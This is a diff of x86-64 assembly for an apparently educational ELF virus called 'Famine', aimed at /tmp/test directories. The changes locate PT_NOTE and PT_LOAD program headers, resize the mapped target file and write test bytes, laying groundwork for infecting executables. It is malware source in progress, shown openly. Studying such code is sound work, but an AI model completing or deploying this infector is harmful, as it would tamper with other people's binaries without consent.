@@ -11,7 +11,7 @@ section .text
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
 
     _start:
-    
+
     ; this trick allows us to access Famine members using the VAR macro
     mov rbp, rsp
     sub rbp, Famine_size            ; allocate Famine struct on stack
@@ -159,6 +159,11 @@ section .text
                 ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
                 xor rax, rax
                 mov eax, dword VAR(Famine.file_original_len)
+                ; align current size to end at 4K page so our payload is aligned by writing it
+                ; at the end.
+                ALIGN rax
+                mov dword VAR(Famine.file_final_len), eax
+
                 mov rcx, VAR(Famine.virus_size)
                 add rax, rcx
 
@@ -185,34 +190,71 @@ section .text
                 add rbx, rax
                 movzx eax, word [rax + Elf64_Ehdr.e_phnum]
 
+                ; initialize variables seeked in loop header
+                xor rcx, rcx
+                mov VAR(Famine.note_phdr_ptr), rcx
+                mov VAR(Famine.max_vaddr_end), rcx
+
                 ;rax = phnum
                 ;rbx = phdr_pointer
+
                 .loop_phdr:
                     cmp rax, 0
-                    jle .close_file
+                    jle .end_loop_phdr
                     ; lo que sea de rbx
 
+                    cmp dword [rbx], 0x01 ;PT_LOAD
+                    je .compute_max_vaddr_end
+
                     cmp dword [rbx], 0x04 ;PT_NOTE
+                    je .assign_pt_note_phdr
+
                     jne .next_phdr
                     ;cmp dword [rbx + Elf64_Phdr.p_align], 0x4
                     ;jne .next_phdr
-                    jmp .process_phdr
+                    jmp .end_loop_phdr
+
+                .assign_pt_note_phdr:
+
+                    cmp qword VAR(Famine.note_phdr_ptr), 0x0
+                    jne .next_phdr
+                    mov VAR(Famine.note_phdr_ptr), rbx
+                    jmp .next_phdr
+
+                .compute_max_vaddr_end:
+                    ; r8 = p_vaddr + p_memsz
+                    mov r8, [rbx+Elf64_Phdr.p_vaddr]
+                    add r8, [rbx+Elf64_Phdr.p_memsz]
+
+                    ; if p_vaddr + p_memsz > max_vaddr_end:
+                    cmp r8, VAR(Famine.max_vaddr_end)
+                    jl .next_phdr
+
+                    ; save new max_vaddr_end
+                    mov VAR(Famine.max_vaddr_end), r8
 
                 .next_phdr:
                     dec rax
                     add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
                     jmp .loop_phdr
 
-                .process_phdr:
-                    TRACE_TEXT hello, 11
-                    ; ftruncate(fd_file, file_original_len + 0x4000)
+
+                .end_loop_phdr:
+
+                    cmp qword VAR(Famine.note_phdr_ptr), 0x0
+                    je .close_file
+
+                    cmp qword VAR(Famine.max_vaddr_end), 0x0
+                    je .close_file
+
+                .ftruncate:
+
+                    ; TRACE_TEXT hello, 11
+
+                    ; ftruncate(fd_file, file_final_len)
                     mov rdi, VAR(Famine.fd_file)
-                    xor rax, rax
-                    mov eax, dword VAR(Famine.file_original_len)
-                    mov rcx, VAR(Famine.virus_size)
-                    add rax, rcx
-                    mov r13, rax
-                    mov rsi, rax
+                    xor rsi, rsi
+                    mov esi, dword VAR(Famine.file_final_len)
                     mov rax, SC_FTRUNCATE
                     syscall
 
@@ -220,10 +262,10 @@ section .text
                     ; rbx = mmap_ptr
                     mov rax, VAR(Famine.mmap_ptr)
 
-                    ; offset penúltimo byte
-                    mov ecx, dword VAR(Famine.file_original_len)
-                    mov rdx, VAR(Famine.virus_size)
-                    add rcx, rdx
+                    ; TEST DE ESCRITURA EN FINAL DE FICHERO.
+                    ; for ff in /tmp/test{,2}/*; do [ ! -d $ff ] && [ -f $ff ] && hexdump -C $ff | tail -2; done
+                    ; ---> miras si aparecen tres A
+                    mov ecx, dword VAR(Famine.file_final_len)
                     dec rcx               ; penúltimo byte
                     add rax, rcx          ; rax = mmap_ptr + total_size - 1
 
@@ -231,14 +273,10 @@ section .text
                     mov byte [rax-1], 65    ; escribir 'A'
                     mov byte [rax-2], 65    ; escribir 'A'
 
-                    mov rdi, 0
-                    mov rsi, r13
-                    xor rdx, MS_SYNC
-                    mov rax, SC_MSYNC
-                    syscall
-
+                .munmap:
+                    ;munmap(map_ptr, )
                     mov rdi, VAR(Famine.mmap_ptr)
-                    mov rsi, r13
+                    mov esi, dword VAR(Famine.file_final_len)
                     mov rax, SC_UNMAP
                     syscall
 
@@ -283,5 +321,5 @@ section .text
         .exit:
             mov rax, SC_EXIT
             syscall
-    
+
     _finish:
